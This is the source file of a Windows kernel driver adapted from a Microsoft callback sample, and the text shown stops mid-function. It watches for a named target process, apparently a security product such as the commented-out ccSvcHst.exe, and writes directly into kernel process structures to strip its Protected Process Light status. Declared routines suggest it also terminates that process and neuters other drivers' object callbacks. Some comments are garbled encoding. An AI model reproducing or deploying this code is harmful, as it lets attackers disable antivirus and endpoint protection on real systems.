/*++

Module Name:

    tdriver.c

Abstract:

    Main module for the Ob and Ps sample code

Notice:
    Use this sample code at your own risk; there is no support from Microsoft for the sample code.
    In addition, this sample code is licensed to you under the terms of the Microsoft Public License
    (http://www.microsoft.com/opensource/licenses.mspx)


--*/

#include "pch.h"
#include "tdriver.h"
#include "wpp.h"
int gRtlUserThreadStartOff;
#include "tdriver.tmh"
int gETHREAD_StartAddrOff;
int EndLoop;
UCHAR* gEntryRoutineHeadBytes;
int  CheckProcessPPL(DWORD pid);
#define log DbgPrint
#define ns NTSTATUS
#define b UCHAR
PUNICODE_STRING TargetProcessName;
DWORD64 Reset;
// Process notify routines.
//

typedef struct _LDR_DATA_TABLE_ENTRY {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	// This struct is larger in reality; we only define needed parts
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
	ULONG Length;
	BOOLEAN Initialized;
	PVOID SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	// Other members not needed here
} PEB_LDR_DATA, *PPEB_LDR_DATA;
VOID RestoreObjectCallback(DWORD64 funcAddr, UCHAR* _3bytes);
typedef struct _PEB {
	BOOLEAN InheritedAddressSpace;
	BOOLEAN ReadImageFileExecOptions;
	BOOLEAN BeingDebugged;
	BOOLEAN Spare;
	PVOID Mutant;
	PVOID ImageBaseAddress;
	PPEB_LDR_DATA Ldr;
	// Other members not needed here
} PEB, *PPEB;
extern 
PPEB PsGetProcessPeb(PEPROCESS Process);
PVOID GetNtdllBaseAddress(PEPROCESS Process)
{
	PVOID ntdllBase = NULL;

	// Get the PEB of the process
	PPEB peb = PsGetProcessPeb(Process);
	if (!peb)
		return NULL;

	KAPC_STATE apc;
	KeStackAttachProcess(Process, &apc);

	__try {
		PPEB_LDR_DATA ldr = peb->Ldr;
		if (!ldr)
			__leave;

		PLIST_ENTRY list = &ldr->InLoadOrderModuleList;
		PLIST_ENTRY entry = list->Flink;

		while (entry != list) {
			PLDR_DATA_TABLE_ENTRY ldrEntry =
				CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

			if (ldrEntry->BaseDllName.Buffer &&
				_wcsicmp(ldrEntry->BaseDllName.Buffer, L"ntdll.dll") == 0) {
				ntdllBase = ldrEntry->DllBase;
				break;
			}

			entry = entry->Flink;
		}

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		ntdllBase = NULL;
	}

	KeUnstackDetachProcess(&apc);
	return ntdllBase;
}
VOID TerminateTargetProcess(int pid,UCHAR* outBuf, DWORD* bytesOut);
typedef struct _OBJECT_CREATE_INFORMATION* POBJECT_CREATE_INFORMATION;
DWORD gPPLOff;
VOID ReadOut3ByteAsmCode(DWORD64 funcAddr, char* tempOut);
PUNICODE_STRING GetFuncModule(DWORD64 funcAddr);
VOID ConvertAnsiToUnicode(char* ansi, PUNICODE_STRING unicode);
DWORD ChangeCallbackFunctionToXoreax_eax_ret(DWORD64 funcAddr);
VOID DisableTargetProcessPPL(DWORD pid);
typedef struct _PPL_WORK_ITEM {
	DWORD pid;
	WORK_QUEUE_ITEM WorkItem;
} PPL_WORK_ITEM, *PPPL_WORK_ITEM;

VOID WorkerRoutine(PVOID Context) {
	PPPL_WORK_ITEM item = (PPPL_WORK_ITEM)Context;
	DisableTargetProcessPPL(item->pid);
	ExFreePool(item);
}

//VOID ProcessNotifyEx(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo) {
//	if (CreateInfo) {
//		PPPL_WORK_ITEM work = ExAllocatePoolWithTag(NonPagedPool, sizeof(PPL_WORK_ITEM), 'pplW');
//		if (work) {
//			work->pid = (DWORD)(ULONG_PTR)ProcessId;
//			ExInitializeWorkItem(&work->WorkItem, WorkerRoutine, work);
//			ExQueueWorkItem(&work->WorkItem, DelayedWorkQueue);
//		}
//	}
//}
VOID DealMsg(UCHAR* a1, UCHAR* outBuf, DWORD* bytesOut);
typedef struct _OBJECT_HEADER {
    volatile LONG_PTR PointerCount;
    union {
        volatile LONG_PTR HandleCount;
        PVOID NextToFree;
    } u1;

    EX_PUSH_LOCK Lock;
    UCHAR TypeIndex;

#define OB_OBJECT_REF_TRACE				0x1
#define OB_OBJECT_TRACE_PERMANENT		0x2
    union {
        UCHAR TraceFlags;
        struct {
            UCHAR DbgRefTrace : 1;
            UCHAR DbgTracePermanent : 1;
        } s1;
    } u2;

    UCHAR InfoMask;

#define OB_FLAG_NEW_OBJECT			0x01
#define OB_FLAG_KERNEL_OBJECT		0x02
#define OB_FLAG_KERNEL_ONLY_ACCESS	0x04
#define OB_FLAG_EXCLUSIVE_OBJECT		0x08
#define OB_FLAG_PERMANENT_OBJECT		0x10
#define OB_FLAG_DEFAULT_SECURITY_QUOTA 0x20
#define OB_FLAG_SINGLE_HANDLE_ENTRY	0x40
#define OB_FLAG_DELETED_INLINE		0x80

    union {
        UCHAR Flags;
        struct {
            UCHAR NewObject : 1;
            UCHAR KernelObject : 1;
            UCHAR KernelOnlyAccess : 1;
            UCHAR ExclusiveObject : 1;
            UCHAR PermanentObject : 1;
            UCHAR DefaultSecurityQuota : 1;
            UCHAR SingleHandleEntry : 1;
            UCHAR DeletedInline : 1;
        } s2;
    } u3;

#if defined(_WIN64)
    ULONG Spare;
#endif

    union {
        POBJECT_CREATE_INFORMATION ObjectCreateInfo;
        PVOID QuotaBlockCharged;
    } u4;

    PSECURITY_DESCRIPTOR SecurityDescriptor;
    QUAD Body;
} OBJECT_HEADER, * POBJECT_HEADER;
void myprintfffff(int a1) {
	if (a1 == 0)
		return;
	int a = 1;
		DbgPrint("%d\n", a + a1); DbgPrint("%d\n", a + a1); DbgPrint("%d\n", a + a1); DbgPrint("%d\n", a + a1); DbgPrint("%d\n", a + a1); DbgPrint("%d\n", a + a1); DbgPrint("%d\n", a + a1); DbgPrint("%d\n", a + a1); DbgPrint("%d\n", a + a1); DbgPrint("%d\n", a + a1); DbgPrint("%d\n", a + a1); DbgPrint("%d\n", a + a1); DbgPrint("%d\n", a + a1);

}

NTSTATUS AllocateUnicodeString2(
	_Out_ PUNICODE_STRING* unicodeString,
	_In_ USHORT maxLength
)
{
	// Allocate memory for the UNICODE_STRING structure
	*unicodeString = (PUNICODE_STRING)ExAllocatePoolWithTag(NonPagedPool, sizeof(UNICODE_STRING), 'tgnU');
	if (*unicodeString == NULL) {
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	// Initialize the structure and allocate the buffer
	RtlZeroMemory(*unicodeString, sizeof(UNICODE_STRING));
	(*unicodeString)->Buffer = (PWSTR)ExAllocatePoolWithTag(NonPagedPool, maxLength, 'tgnU');
	RtlZeroMemory((*unicodeString)->Buffer, maxLength);
	if ((*unicodeString)->Buffer == NULL) {
		ExFreePoolWithTag(*unicodeString, 'tgnU');
		*unicodeString = NULL;
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	// Set the maximum length and initialize the current length
	(*unicodeString)->MaximumLength = maxLength;
	(*unicodeString)->Length = 0;

	return STATUS_SUCCESS;
}
NTSTATUS AllocateUnicodeString(PUNICODE_STRING ustr, PCWSTR src, PUNICODE_STRING* c)
{
    SIZE_T len = wcslen(src) * sizeof(WCHAR);
  ustr=  (PUNICODE_STRING)ExAllocatePoolWithTag(PagedPool, sizeof(UNICODE_STRING), 'uStr');
    ustr->Buffer = (PWCH)ExAllocatePoolWithTag(PagedPool, len + sizeof(WCHAR), 'uStr');
    if (!ustr->Buffer) return STATUS_INSUFFICIENT_RESOURCES;
    *c = ustr;
    RtlCopyMemory(ustr->Buffer, src, len);
    ustr->Buffer[len / sizeof(WCHAR)] = L'\0'; // Null-terminate

    ustr->Length = (USHORT)len;
    ustr->MaximumLength = (USHORT)(len + sizeof(WCHAR));

    return STATUS_SUCCESS;
}
typedef struct _OBJECT_HEADER_NAME_INFO {
    PVOID Directory;
    UNICODE_STRING Name;
    LONG ReferenceCount;
} OBJECT_HEADER_NAME_INFO, * POBJECT_HEADER_NAME_INFO;

#define OBJECT_TO_OBJECT_HEADER(o) \
	CONTAINING_RECORD((o), OBJECT_HEADER, Body)
//
// TdSetCallContext
//
// Creates a call context object and stores a pointer to it
// in the supplied OB_PRE_OPERATION_INFORMATION structure.
//
// This function is called from a pre-notification. The created call context
// object then has to be freed in a corresponding post-notification using
// TdCheckAndFreeCallContext.
//
NTKERNELAPI
ULONG
NtBuildNumber;

UCHAR
InfoMaskToOffset(
    _In_ UCHAR InfoMask
)
{
    const USHORT NtBuild = (NtBuildNumber & 0xFFFF);
    UCHAR Result = 0;
#ifdef _WIN64
    if ((InfoMask & 0x1) != 0)
        Result += 0x20;
    if ((InfoMask & 0x2) != 0)
        Result += 0x20;
    if ((InfoMask & 0x4) != 0)
        Result += 0x10;
    if ((InfoMask & 0x8) != 0)
        Result += 0x20;
    if ((InfoMask & 0x10) != 0)
        Result += 0x10;
    if ((InfoMask & 0x20) != 0)
        Result += (NtBuild <= 7601 ? 0x4 : 0x10);
    if ((InfoMask & 0x40) != 0)
        Result += (NtBuild <= 9600 ? 0x4 : (NtBuild <= 10586 ? 0x20 : 0x10));
    if ((InfoMask & 0x80) != 0)
        Result += 0x4;
#else
    if ((InfoMask & 0x1) != 0)
        Result += 0x10;
    if ((InfoMask & 0x2) != 0)
        Result += 0x10;
    if ((InfoMask & 0x4) != 0)
        Result += 0x8;
    if ((InfoMask & 0x8) != 0)
        Result += 0x10;
    if ((InfoMask & 0x10) != 0)
        Result += 0x8;
    if ((InfoMask & 0x20) != 0)
        Result += (NtBuild <= 7601 ? 0x4 : 0x8);
    if ((InfoMask & 0x40) != 0)
        Result += (NtBuild <= 9600 ? 0x4 : (NtBuild <= 10586 ? 0x10 : 0x8));
    if ((InfoMask & 0x80) != 0)
        Result += 0x4;
#endif
    return Result;
}

BOOLEAN TdProcessNotifyRoutineSet2 = FALSE;

// allow filter the requested access
BOOLEAN TdbProtectName = FALSE;
BOOLEAN TdbRejectName = FALSE;
PUNICODE_STRING gTargetProcessName; 
PUNICODE_STRING gTargetProcessFolderPath;
//
// Function declarations
//
DRIVER_INITIALIZE  DriverEntry;

_Dispatch_type_(IRP_MJ_CREATE) DRIVER_DISPATCH TdDeviceCreate;
_Dispatch_type_(IRP_MJ_CLOSE) DRIVER_DISPATCH TdDeviceClose;
_Dispatch_type_(IRP_MJ_CLEANUP) DRIVER_DISPATCH TdDeviceCleanup;
_Dispatch_type_(IRP_MJ_DEVICE_CONTROL) DRIVER_DISPATCH TdDeviceControl;

DRIVER_UNLOAD   TdDeviceUnload;


 
typedef struct _AV_SCANNER_GLOBAL_DATA2 {

    //
    //  A counter for Scan Id
    //

    LONGLONG ScanIdCounter;

    //
    //  The global FLT_FILTER pointer. Many API needs this, such as 
    //  FltAllocateContext(...)
    //

    PFLT_FILTER Filter;

    //
    //  Server-side communicate ports.
    //

    PFLT_PORT ScanServerPort;
    PFLT_PORT AbortServerPort;
    PFLT_PORT QueryServerPort;

    //
    //  The scan client ports.
    //  These ports are assigned at AvConnectNotifyCallback and cleaned at 
    // 
    //
    //  ScanClientPort is the connection port regarding the scan message.
    //  AbortClientPort is the connection port regarding the abort message.
    //  QueryClient is the connection port regarding the query command.
    //

    PFLT_PORT ScanClientPort;
    PFLT_PORT AbortClientPort;
    PFLT_PORT QueryClientPort;

    //
    //  Scan context list head. 
    //  At AvMessageNotifyCallback, when user passes ScanCtxId, we 
    //  have to check the validity of the id by checking this list.
    //

    LIST_ENTRY ScanCtxListHead;

    //
    //  The lock that synchronizes the accesses of the scan context list above.
    //

    ERESOURCE fs_ep_lock;

    //
    //  Timeout for local file scans in milliseconds
    //

    LONGLONG LocalScanTimeout;

    //
    //  Timeout for network file scans in milliseconds
    //

    LONGLONG NetworkScanTimeout;

#if DBG

    //
    // Field to control nature of debug output
    //

    ULONG DebugLevel;
#endif

    //
    //  A flag that indicating that the filter is being unloaded.
    //    

    BOOLEAN  Unloading;
    PEPROCESS fs_ep;
    HANDLE pid;
	int a;
} AV_SCANNER_GLOBAL_DATA2, * PAV_SCANNER_GLOBAL_DATA2;
AV_SCANNER_GLOBAL_DATA2 g; 
FORCEINLINE
VOID
_Releases_lock_(_Global_critical_region_)
_Requires_lock_held_(_Global_critical_region_)
AvReleaseResource(
    _Inout_ _Requires_lock_held_(*Resource) _Releases_lock_(*Resource) PERESOURCE Resource
)
{
    FLT_ASSERT(KeGetCurrentIrql() <= APC_LEVEL);
    FLT_ASSERT(ExIsResourceAcquiredExclusiveLite(Resource) ||
        ExIsResourceAcquiredSharedLite(Resource));

    ExReleaseResourceLite(Resource);
    KeLeaveCriticalRegion();
}

FORCEINLINE
VOID
_Acquires_lock_(_Global_critical_region_)
AvAcquireResourceExclusive(
    _Inout_ _Acquires_exclusive_lock_(*Resource) PERESOURCE Resource
)
{
    FLT_ASSERT(KeGetCurrentIrql() <= APC_LEVEL);
    FLT_ASSERT(ExIsResourceAcquiredExclusiveLite(Resource) ||
        !ExIsResourceAcquiredSharedLite(Resource));

    KeEnterCriticalRegion();
    (VOID)ExAcquireResourceExclusiveLite(Resource, TRUE);

}


FORCEINLINE
VOID
_Acquires_lock_(_Global_critical_region_)
AvAcquireResourceShared(
    _Inout_ _Acquires_shared_lock_(*Resource) PERESOURCE Resource
)
{
    FLT_ASSERT(KeGetCurrentIrql() <= APC_LEVEL);

    KeEnterCriticalRegion(); // why here is no leave call
    (VOID)ExAcquireResourceSharedLite(Resource, TRUE);

}

FLT_PREOP_CALLBACK_STATUS
OnPreWrite(
    _Inout_ PFLT_CALLBACK_DATA Data,
    _In_ PCFLT_RELATED_OBJECTS FltObjects,
    _Flt_CompletionContext_Outptr_ PVOID* CompletionContext
) {
    (FltObjects); (CompletionContext);
    // DbgBreakPoint();
    b* ethread = (b*)Data->Thread;
    b* eprocess = (b*)(*(DWORD64*)(ethread + 0x220));
    // log("[AvPreCreate] eprocess: 0x%p\n", eprocess);
   // DbgBreakPoint();
    PEPROCESS ep_temp = 0;
    // compare eporcess wtih global data
    AvAcquireResourceShared(&g.fs_ep_lock);
    ep_temp = g.fs_ep;
    AvReleaseResource(&g.fs_ep_lock);
    if (eprocess != (b*)ep_temp) {
        //   log("[AvPreCreate] eprocess mismatch\n");
        return FLT_PREOP_SUCCESS_NO_CALLBACK;
    }
    //   log("[AvPreCreate]: eprocess match: %p\n", eprocess);
  //  DbgBreakPoint();
 //   KdPrintEx((FOR_DRIVER_STATUS, TRACE_LEVEL_ERROR, "%wZ\n", &Data->Iopb->TargetFileObject->FileName));

    // print file name
  //  log("[AvPreCreate]: %wZ\n", Data->Iopb->TargetFileObject->FileName);


    return FLT_PREOP_SUCCESS_NO_CALLBACK;
}
FLT_PREOP_CALLBACK_STATUS
AvPreCreate(
    _Inout_ PFLT_CALLBACK_DATA Data,
    _In_ PCFLT_RELATED_OBJECTS FltObjects,
    _Flt_CompletionContext_Outptr_ PVOID* CompletionContext
) {

    (FltObjects); (CompletionContext);
    // DbgBreakPoint();
    b* ethread = (b*)Data->Thread;
    b* eprocess = (b*)(*(DWORD64*)(ethread + 0x220));
    // log("[AvPreCreate] eprocess: 0x%p\n", eprocess);
   // DbgBreakPoint();
    PEPROCESS ep_temp = 0;
    // compare eporcess wtih global data
    AvAcquireResourceShared(&g.fs_ep_lock);
    ep_temp = g.fs_ep;
    AvReleaseResource(&g.fs_ep_lock);
    if (eprocess != (b*)ep_temp) {
        //   log("[AvPreCreate] eprocess mismatch\n");
        return FLT_PREOP_SUCCESS_NO_CALLBACK;
    }
    //   log("[AvPreCreate]: eprocess match: %p\n", eprocess);
     // DbgBreakPoint();

      // print file name
      //log("[AvPreCreate]: %wZ\n", Data->Iopb->TargetFileObject->FileName);
    ULONG hash = 0;
    RtlHashUnicodeString(&Data->Iopb->TargetFileObject->FileName, TRUE, HASH_STRING_ALGORITHM_X65599, &hash);
   // KdPrintEx((FOR_DRIVER_STATUS, TRACE_LEVEL_ERROR, "[AvPreCreate]: %wZ, hash: 0x%X\n", &Data->Iopb->TargetFileObject->FileName, hash));

    return FLT_PREOP_SUCCESS_NO_CALLBACK;
}
CONST FLT_OPERATION_REGISTRATION Callbacks[] = {
    { IRP_MJ_CREATE,
      0,
      AvPreCreate,
      0 },
      // KdPrintEx((FOR_DRIVER_STATUS, TRACE_LEVEL_ERROR, "fsfilter is loaded\n"));

    {
        IRP_MJ_WRITE,
        0,
        OnPreWrite
    },
    { IRP_MJ_OPERATION_END }
};
#define DRIVER_TAG 0x95272328
typedef struct _FileContext {
    LARGE_INTEGER BackupTime;
    BOOLEAN Written;
    ULONG mark;
}FileContext;
CONST FLT_CONTEXT_REGISTRATION g_context[] = {
    {FLT_FILE_CONTEXT,0,0,sizeof(FileContext),DRIVER_TAG},
    {FLT_CONTEXT_END}
};


PFLT_FILTER g_minifilterHandle = NULL;
PDRIVER_OBJECT  g_minifilterDriverObject = NULL;
VOID
FileBackupInstanceTeardownComplete(
    _In_ PCFLT_RELATED_OBJECTS FltObjects,
    _In_ FLT_INSTANCE_TEARDOWN_FLAGS Flags
)
{
    UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(Flags);

    PAGED_CODE();

    // KdPrintEx((FOR_DEBUG, TRACE_LEVEL_ERROR, "FileBackup!FileBackupInstanceTeardownComplete: Entered\n"));

}

VOID
FileBackupInstanceTeardownStart(
    _In_ PCFLT_RELATED_OBJECTS FltObjects,
    _In_ FLT_INSTANCE_TEARDOWN_FLAGS Flags
)
{
    UNREFERENCED_PARAMETER(FltObjects);
    UNREFERENCED_PARAMETER(Flags);

    PAGED_CODE();

    // KdPrintEx((FOR_DEBUG, TRACE_LEVEL_ERROR, "FileBackup!FileBackupInstanceTeardownStart: Entered\n"));

}


NTSTATUS FLTAPI InstanceSetupCallback(
    _In_ PCFLT_RELATED_OBJECTS  FltObjects,
    _In_ FLT_INSTANCE_SETUP_FLAGS  Flags,
    _In_ DEVICE_TYPE  VolumeDeviceType,
    _In_ FLT_FILESYSTEM_TYPE  VolumeFilesystemType)
{
    (FltObjects);
    (Flags);
    (VolumeDeviceType);
    //
    // This is called to see if a filter would like to attach an instance to the given volume.
    //
    //   Ϊ      Ҫ ѱ      ݴ洢  NTFS stream У         ֻ֧  NTFS ļ ϵͳ        Ҫ     ж 
    return VolumeFilesystemType == FLT_FSTYPE_NTFS ? STATUS_SUCCESS : STATUS_FLT_DO_NOT_ATTACH;
}

NTSTATUS FLTAPI InstanceQueryTeardownCallback(
    _In_ PCFLT_RELATED_OBJECTS FltObjects,
    _In_ FLT_INSTANCE_QUERY_TEARDOWN_FLAGS Flags
)
{
    (FltObjects);
    (Flags);
    //
    // This is called to see if the filter wants to detach from the given volume.
    //

    return STATUS_SUCCESS;
}
VOID ResumeSleepThread();
VOID KmExtsPsCreateThreadNotifyRoutineEx(
	HANDLE ProcessId,
	HANDLE ThreadId,
	BOOLEAN Create);
DWORD64 GMyTargetPId;
int ListProcessModules(HANDLE pid, PUNICODE_STRING sgTargetProcessFolderPath)
{
	int ret = 0;
	PEPROCESS Process;
	KAPC_STATE apc;
	PPEB Peb;
	PPEB_LDR_DATA Ldr;
	PLIST_ENTRY ModuleList;
	PLDR_DATA_TABLE_ENTRY LdrEntry;

	if (!NT_SUCCESS(PsLookupProcessByProcessId(pid, &Process))) {
		DbgPrint("Process not found.\n");
		return;
	}

	KeStackAttachProcess(Process, &apc);

	__try {
		Peb = PsGetProcessPeb(Process);
		if (!Peb || !Peb->Ldr) {
			DbgPrint("No PEB or Ldr.\n");
			__leave;
		}

		Ldr = Peb->Ldr;
		ModuleList = &Ldr->InLoadOrderModuleList;
		PLIST_ENTRY pList = ModuleList->Flink;

		while (pList != ModuleList) {
			LdrEntry = CONTAINING_RECORD(pList, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

			if (LdrEntry->FullDllName.Buffer) {
				// Safe because we are attached to the process
		 
				if (RtlPrefixUnicodeString(sgTargetProcessFolderPath, &LdrEntry->FullDllName, TRUE)) {
					ret = 1;
					break;
				}
			}

			pList = pList->Flink;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		DbgPrint("Exception reading modules.\n");
	}

	KeUnstackDetachProcess(&apc);
	ObDereferenceObject(Process);
	return ret;
}
VOID
TdCreateProcessNotifyRoutine2(
	_Inout_ PEPROCESS Process,
	_In_ HANDLE ProcessId,
	_In_opt_ PPS_CREATE_NOTIFY_INFO CreateInfo
);

PDRIVER_OBJECT gDriverObject;
NTSTATUS FLTAPI InstanceFilterUnloadCallback(FLT_FILTER_UNLOAD_FLAGS Flags) {
    (Flags);
    // minifilter     û  unload routine   ֱ  ʹ  ע   unload ص       ж   Լ   

	// Wait until the resource is no longer acquired
	while (ExIsResourceAcquiredSharedLite(&g.fs_ep_lock) ||
		ExIsResourceAcquiredExclusiveLite(&g.fs_ep_lock)) {
		DbgPrint("fs_ep_lock is still being used\n");
		// Yield to allow the owning thread to release it
		LARGE_INTEGER interval;
		interval.QuadPart = -10 * 1000 * 10; // 10 milliseconds
		KeDelayExecutionThread(KernelMode, FALSE, &interval);
	}

	ExDeleteResourceLite(&g.fs_ep_lock);

        // DbgBreakPoint(); 
    if (g_minifilterHandle)
        FltUnregisterFilter(g_minifilterHandle);
	if(gEntryRoutineHeadBytes)
	ExFreePool(gEntryRoutineHeadBytes);
    // KdPrintEx((FOR_DRIVER_STATUS, TRACE_LEVEL_ERROR, "minifilter driver is unloaded\n"));
    WPP_CLEANUP(g_minifilterDriverObject);
    //   Ҫ  ж غ    йر ͨ Ŷ˿ 





	NTSTATUS Status = STATUS_SUCCESS;
	UNICODE_STRING DosDevicesLinkName = RTL_CONSTANT_STRING(TD_DOS_DEVICES_LINK_NAME);

	DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_TRACE_LEVEL, "ObCallbackTest: TdDeviceUnload\n");

	//
	// Unregister process notify routines.
	//

	if (TdProcessNotifyRoutineSet2 == TRUE)
	{
		Status = PsSetCreateProcessNotifyRoutineEx(
			TdCreateProcessNotifyRoutine2,
			TRUE
		);

		TD_ASSERT(Status == STATUS_SUCCESS);

		TdProcessNotifyRoutineSet2 = FALSE;
		PsRemoveCreateThreadNotifyRoutine(KmExtsPsCreateThreadNotifyRoutineEx);
	}

	// remove filtering and remove any OB callbacks
	TdbProtectName = FALSE;
	Status = TdDeleteProtectNameCallback();
	TD_ASSERT(Status == STATUS_SUCCESS);

	//
	// Delete the link from our device name to a name in the Win32 namespace.
	//

	Status = IoDeleteSymbolicLink(&DosDevicesLinkName);
	if (Status != STATUS_INSUFFICIENT_RESOURCES) {
		//
		// IoDeleteSymbolicLink can fail with STATUS_INSUFFICIENT_RESOURCES.
		//

		TD_ASSERT(NT_SUCCESS(Status));

	}


	//
	// Delete our device object.
	//

	IoDeleteDevice(gDriverObject->DeviceObject);



	//{
	//	// Allocate memory for the UNICODE_STRING structure
	//	*unicodeString = (PUNICODE_STRING)ExAllocatePoolWithTag(NonPagedPool, sizeof(UNICODE_STRING), 'tgnU');
	//	if (*unicodeString == NULL) {
	//		return STATUS_INSUFFICIENT_RESOURCES;
	//	}
	//
	//	// Initialize the structure and allocate the buffer
	//	RtlZeroMemory(*unicodeString, sizeof(UNICODE_STRING));
	//	(*unicodeString)->Buffer = (PWSTR)ExAllocatePoolWithTag(NonPagedPool, maxLength, 'tgnU');
	ExFreePool(gTargetProcessName->Buffer);
	ExFreePool(gTargetProcessName);
	ExFreePool(TargetProcessName->Buffer);
	ExFreePool(TargetProcessName);
	ExFreePool(gTargetProcessFolderPath->Buffer);
	ExFreePool(gTargetProcessFolderPath);
	
	
    return STATUS_SUCCESS;
}

CONST FLT_OPERATION_REGISTRATION g_callbacks[] =
{
    {
        IRP_MJ_CREATE,
        0,
       AvPreCreate,
        0
    },

    { IRP_MJ_OPERATION_END }
};
CONST FLT_REGISTRATION FilterRegistration =
{
    sizeof(FLT_REGISTRATION),      //  Size
    FLT_REGISTRATION_VERSION,      //  Version
    0,                             //  Flags
    g_context,                          //  Context registration
    g_callbacks,                   //  Operation callbacks
    InstanceFilterUnloadCallback,  //  FilterUnload
    InstanceSetupCallback,         //  InstanceSetup
    InstanceQueryTeardownCallback, //  InstanceQueryTeardown
    FileBackupInstanceTeardownStart,                          //  InstanceTeardownStart
    FileBackupInstanceTeardownComplete,                          //  InstanceTeardownComplete
    NULL,                          //  GenerateFileName
    NULL,                          //  GenerateDestinationFileName
    NULL                           //  NormalizeNameComponent
};

NTSTATUS GetProcessImagePath(PEPROCESS Process, PUNICODE_STRING* ImagePath) {
    NTSTATUS status = SeLocateProcessImageName(Process, ImagePath);
    if (NT_SUCCESS(status)) {
        //DbgPrint("Process Image Path: %wZ\n", *ImagePath);
		return status;
    }
    else {
        DbgPrint("Failed to get process image path: 0x%X\n", status);
    }
    return status;
}
BOOLEAN RtlSMyuffixUnicodeString(const UNICODE_STRING* str, const UNICODE_STRING* suffix, BOOLEAN caseInsensitive) {
    *(USHORT*)suffix = wcslen(suffix->Buffer) * sizeof(WCHAR);
    // Validate input
    if (!str || !suffix || !str->Buffer || !suffix->Buffer) {
        return FALSE;
    }

    // Ensure the string is long enough to contain the suffix
    if (suffix->Length > str->Length) {
        return FALSE;
    }

    // Find the start position of the suffix in the main string
    USHORT offset = (str->Length - suffix->Length) / sizeof(WCHAR);
    WCHAR* strEnd = str->Buffer + offset;

    // Compare the suffix with the end of the main string
    return RtlEqualMemory(strEnd, suffix->Buffer, suffix->Length) ||
        (caseInsensitive && RtlEqualUnicodeString((UNICODE_STRING*)&(UNICODE_STRING) { suffix->Length, suffix->MaximumLength, strEnd }, suffix, TRUE));
}
int gTargetTerminated;
int gNowYouCanStartCapture;
HANDLE gTargetEPTobeCrashed;
DWORD64 GMyTargetPId;
VOID
TdCreateProcessNotifyRoutine2(
    _Inout_ PEPROCESS Process,
    _In_ HANDLE ProcessId,
    _In_opt_ PPS_CREATE_NOTIFY_INFO CreateInfo
)
{
	AvAcquireResourceExclusive(&g.fs_ep_lock);
	if (!gPPLOff) {
		AvReleaseResource(&g.fs_ep_lock);
		DbgPrint("you must set ppl offset first\n");
		return;
	}
    (ProcessId);
	// if (*(UCHAR*)(gTargetProcessName) == 0)
	// 	return;
	// if (!gTargetEPTobeCrashed)
	// 	return;
	
	AvReleaseResource(&g.fs_ep_lock);
    if (CreateInfo)
    {
		AvAcquireResourceExclusive(&g.fs_ep_lock);
		if (!gNowYouCanStartCapture) {

			AvReleaseResource(&g.fs_ep_lock);
			return;
		}// 检查是否为目标文件
		//if (*((UCHAR*)Process + 0x3a6) == 0)
		//	return;
		AvReleaseResource(&g.fs_ep_lock);
        PEPROCESS e = Process;
        PUNICODE_STRING imagePath;
        if (NT_SUCCESS(GetProcessImagePath(e, &imagePath))) {
            // Do something with imagePath->Buffer

            UNICODE_STRING unicodeStr;
			
            // Initialize with a string literal
			AvAcquireResourceExclusive(&g.fs_ep_lock); 
         //   RtlInitUnicodeString(&unicodeStr, L"ccSvcHst.exe");
            // RtlInitUnicodeString(&unicodeStr, L"CLangTest.exe");
            if (RtlSMyuffixUnicodeString(imagePath, gTargetProcessName, 1)) {
                g.fs_ep = Reset;
                if (!g.fs_ep  ) {
					//myprintfffff(1);
				//	DbgBreakPoint();
                    // if (!g.fs_ep && a1 == 0x6578652e646d63){
                       // compare eporcess wtih global data
                    g.fs_ep = Process;
                    g.pid = ProcessId;
                    Reset = g.fs_ep;
					*((UCHAR*)Process + gPPLOff) = 0;
					DbgPrint("ep: 0x%p\n", Process);
					DbgPrint("current process id: 0x%x\n", ProcessId);
                    log("[TdCreateProcessNotifyRoutine2]: targer eprocess located: %p\n", Process);

					// 关闭ppl
					PPPL_WORK_ITEM work = ExAllocatePoolWithTag(NonPagedPool, sizeof(PPL_WORK_ITEM), 'pplW');
					if (work) {
						work->pid = (DWORD)(ULONG_PTR)ProcessId;
						ExInitializeWorkItem(&work->WorkItem, WorkerRoutine, work);
						ExQueueWorkItem(&work->WorkItem, DelayedWorkQueue);
					}
					//DisableTargetProcessPPL(Process);

                   // 捕获到目标进程，停止捕获
					gNowYouCanStartCapture = 0;
					g.fs_ep = 0;
                }
                ExFreePool(imagePath);  // Must free memory after use
				AvReleaseResource(&g.fs_ep_lock);
                return;
            }
			AvReleaseResource(&g.fs_ep_lock);
        }
        return;
        const PDEVICE_OBJECT DeviceObject = CreateInfo->FileObject->DeviceObject;
        if (DeviceObject != NULL)
        {
            const POBJECT_HEADER ObjectHeader = OBJECT_TO_OBJECT_HEADER(DeviceObject);
            const UCHAR InfoMask = ObjectHeader->InfoMask;
            if ((InfoMask & 0x2) != 0)
            {
                const POBJECT_HEADER_NAME_INFO NameInfo = (POBJECT_HEADER_NAME_INFO)((PUCHAR)ObjectHeader - InfoMaskToOffset(InfoMask & 0x3));
                if (NameInfo != NULL)
                {
                    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "%wZ\n", &NameInfo->Name); // Prints "HarddiskVolume3"
                }
            }
        }
    }
	else {
		// 目标进程被杀掉，我们可以开始捕获进程创建事件了 
		AvAcquireResourceExclusive(&g.fs_ep_lock);
		if (gTargetEPTobeCrashed == ProcessId)

		{		gNowYouCanStartCapture = 1;
		gTargetTerminated = 1;
	}
		AvReleaseResource(&g.fs_ep_lock);
	}
    return;

    //  b* ethread = (b*)Data->Thread;
    b* eprocess = (b*)Process;
    //PEPROCESS ep_temp = 0;
